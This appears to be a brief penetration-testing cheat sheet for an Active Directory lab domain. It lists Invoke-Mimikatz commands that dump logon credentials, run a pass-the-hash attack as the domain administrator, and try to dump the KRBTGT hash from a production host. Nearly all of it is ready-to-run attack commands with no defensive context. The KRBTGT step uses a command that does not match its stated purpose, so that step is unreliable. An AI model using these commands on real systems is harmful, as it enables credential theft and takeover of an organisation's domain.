- Open command prompt whith run as administrator to dump and do pth attack to the administrator user
```
Invoke-Mimikatz -command '"privilege::debug" "sekurlsa::logonpasswords"'

```
- Perform Pth attack 
```
Invoke-Mimikatz -command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:ntlmhash /run:powershell.exe"'
```
- And dump KRBTGT hash with the admimistrator
```
Invoke-Mimikatz -command '"kerberos::list /patch"' -computername prod.research.security.local
```
